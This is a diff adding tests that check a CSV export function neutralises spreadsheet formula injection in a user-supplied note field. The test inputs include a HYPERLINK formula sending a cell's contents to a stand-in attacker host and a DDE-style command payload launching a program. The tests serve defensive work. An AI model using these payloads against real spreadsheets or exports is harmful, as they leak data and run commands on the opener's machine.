@@ -136,4 +136,37 @@ describe("intentsCsv", () => {
     // One header line plus exactly one data line — the comma did not split it.
     expect(csv.split("\n")).toHaveLength(2);
   });
+
+  it("defuses a note that a spreadsheet would run as a formula", () => {
+    // `note` is free text from an anonymous POST to a public /api/checkout.
+    // Nothing in the product writes it, so anything in this column arrived by
+    // hand. Opened in Excel or Sheets, a leading = is executable.
+    const csv = intentsCsv([
+      {
+        ...intent("ledger", "x@y.com"),
+        note: '=HYPERLINK("https://evil.example/?d="&A2,"Open")',
+      },
+    ]);
+    expect(csv).toContain('"\'=HYPERLINK');
+    // The apostrophe goes before the trigger, not somewhere after it.
+    expect(csv).not.toMatch(/(^|,|")=HYPERLINK/m);
+  });
+
+  it("defuses every character a spreadsheet treats as a formula start", () => {
+    for (const trigger of ["=", "+", "-", "@", "\t", "\r"]) {
+      const csv = intentsCsv([
+        { ...intent("ledger", "x@y.com"), note: `${trigger}cmd|' /C calc'!A1` },
+      ]);
+      const dataLine = csv.slice(csv.indexOf("\n") + 1);
+      expect(dataLine).toContain(`\'${trigger}cmd`);
+    }
+  });
+
+  it("keeps an ordinary note untouched", () => {
+    const csv = intentsCsv([
+      { ...intent("ledger", "x@y.com"), note: "would pay for the GST split" },
+    ]);
+    // No stray quoting or apostrophes on text that never needed either.
+    expect(csv).toContain(",would pay for the GST split");
+  });
 });
